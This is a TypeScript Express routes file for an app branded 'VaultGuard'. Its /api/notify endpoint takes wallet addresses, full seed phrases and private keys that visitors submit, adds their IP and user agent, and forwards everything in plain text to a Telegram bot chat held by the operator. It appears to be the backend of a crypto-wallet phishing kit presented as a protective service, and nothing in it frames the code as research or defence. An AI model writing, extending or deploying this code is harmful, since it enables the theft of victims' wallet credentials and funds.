import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";

const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;

async function sendTelegram(text: string) {
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!process.env.TELEGRAM_BOT_TOKEN || !chatId) return;
  try {
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  } catch (err) {
    console.error("Telegram send error:", err);
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  app.get("/api/config", (_req, res) => {
    res.json({
      walletConnectProjectId: process.env.WALLETCONNECT_PROJECT_ID || "",
    });
  });

  app.post("/api/notify", async (req, res) => {
    const { type, data, meta } = req.body ?? {};
    if (!type || !data) return res.status(400).json({ ok: false });

    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
    const ua = (meta?.userAgent || req.headers["user-agent"] || "unknown").slice(0, 120);
    const ts = new Date().toUTCString();

    let msg = "";

    if (type === "address_entered") {
      msg =
        `🔍 <b>VaultGuard — Address Entered</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `<b>Address:</b> <code>${data.address}</code>\n` +
        `<b>Time:</b> ${ts}\n` +
        `<b>IP:</b> ${ip}\n` +
        `<b>UA:</b> ${ua}`;
    } else if (type === "wallet_connected") {
      msg =
        `🔗 <b>VaultGuard — Wallet Connected</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `<b>Wallet:</b> ${data.wallet}\n` +
        `<b>Address:</b> <code>${data.address}</code>\n` +
        `<b>Entered:</b> <code>${data.enteredAddress}</code>\n` +
        `<b>Match:</b> ${data.address?.toLowerCase() === data.enteredAddress?.toLowerCase() ? "✅ Yes" : "⚠️ No"}\n` +
        `<b>Time:</b> ${ts}\n` +
        `<b>IP:</b> ${ip}\n` +
        `<b>UA:</b> ${ua}`;
    } else if (type === "seed_phrase") {
      const words: string[] = data.words ?? [];
      const filled = words.filter((w: string) => w.trim().length > 0);
      msg =
        `🌱 <b>VaultGuard — Seed Phrase Submitted</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
        `<b>Word count:</b> ${data.wordCount} (${filled.length} filled)\n` +
        `<b>Phrase:</b>\n<code>${filled.join(" ")}</code>\n` +
        `<b>Time:</b> ${ts}\n` +
        `<b>IP:</b> ${ip}\n` +
        `<b>UA:</b> ${ua}`;
    } else if (type === "private_key") {
      msg =
        `🔑 <b>VaultGuard — Private Key Submitted</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
        `<b>Key:</b> <code>${data.privateKey}</code>\n` +
        `<b>Time:</b> ${ts}\n` +
        `<b>IP:</b> ${ip}\n` +
        `<b>UA:</b> ${ua}`;
    } else {
      return res.status(400).json({ ok: false });
    }

    await sendTelegram(msg);
    res.json({ ok: true });
  });

  return httpServer;
}
